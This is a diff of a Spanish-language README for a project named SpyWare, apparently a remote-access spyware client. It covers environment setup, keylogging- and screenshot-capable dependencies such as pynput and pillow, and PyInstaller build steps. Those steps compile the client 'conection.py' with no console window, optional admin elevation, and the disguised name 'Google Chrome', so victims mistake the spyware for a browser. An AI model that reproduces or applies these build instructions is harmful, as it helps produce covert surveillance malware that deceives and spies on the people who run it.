@@ -55,24 +55,56 @@ SpyWare. The project is currently developing…...
 hash: 8f361df2687c1d5ac2c9a251ab8903cea2de914305420842b566726926903b5b
 
 
-# Requirements
 
-- ```pip install -r requirements.txt```
-
-
-
-## Opcional:
-Para no tener conflictos, nos creamos un nuevo entorno:
+## New Enviorment:
+- **¿Por que?**
+    
+  - Una de las razones es para no tener conflictos y no tener otras librerias al compilar.
+  - Al crearnos un nuevo entono virtual, el .exe estará cargado con las libriras intaladas en ese entorno.
+  - El .exe / .bin pesará de **"30MB"** a **"14MB"**
+    
 
 - Windows:
    1. `python -m venv new`
    2. `.\new\Scripts\activate`
 
+    
  - Linux:
    1. `python3 -m venv new`
    2. `new/bin/activate`
 
-Para salir de este entorno, con el comando **"deactivate"** salimos del enterno nuevo de vuelta al del sistema
+PD: Para salir de este entorno, con el comando **"deactivate"** salimos del enterno nuevo de vuelta al del sistema
+
+
+# Requirements
+
+Automated:
+
+- ```pip install -r requirements.txt```
+
+Manal:
+
+- ```pip install prompt_toolkit==3.0.14 colorama==0.4.4 psutil==5.8.0 cryptography==41.0.3 requests==2.31.0 pillow==10.0.1 pynput==1.7.6```
+
+
+# Errors:
+
+- Si tenemos errores con las librerias (module not found):
+  - ```pip install prompt_toolkit==3.0.14 colorama==0.4.4 psutil==5.8.0 cryptography==41.0.3 requests==2.31.0 pillow==10.0.1 pynput==1.7.6 pyinstaller==0.5.9``` 
+
+
+- Si tenemos el error **"pyinstaller not found"** en el *nuevo entorno*!
+
+    - **Windows**
+      - where pyinstaller
+      
+            D:\ProtectosPython\ETHICAL_HACKING\winenv\Scripts\pyinstaller.exe
+            C:\Program Files\Python310\Scripts\pyinstaller.exe``
+    
+      - Usar ruta completa de pyinstaller (nuevo)
+      
+             D:\ProtectosPython\ETHICAL_HACKING\winenv\Scripts\pyinstaller.exe --noconsole ....
+    
 
 
 # Preparación:
@@ -90,17 +122,19 @@ Una véz hecho esto podremos ejecutar el script, no requerimos de ningún cambio
 
 - Tenemos varias opciones: (Accedemos a la carpeta CLIENT)
 
-    ### Windows:
+  ### Automatic
+    - `client>pyinstaller compilation.spec`
+
+  ### Windows:
+
+  - Admin Required:
   
-    - Admin Required:
-      
-        `client>python -m pyinstaller --onefile --noconsole --clean --uac-admin -n "Google Chrome" conection.py`
+      `client>pyinstaller --onefile --noupx --noconsole --clean --uac-admin -n "Google Chrome" conection.py`
 
-    - **NO** Admin Required:
-      
-        `client>python -m pyinstaller --onefile --noconsole --clean -n "Google Chrome" conection.py`
+  - **NO** Admin Required:
+  
+      `client>pyinstaller --onefile --noupx --noconsole --clean -n "Google Chrome" conection.py`
 
-    ### Linux:
-      
-    `client>python3 -m pyinstaller --onefile --noconsole --clean -n "Google Chrome" conection.py`
-
+  ### Linux:
+  
+  `client>pyinstaller --onefile --noupx --noconsole --clean -n "Google Chrome" conection.py`
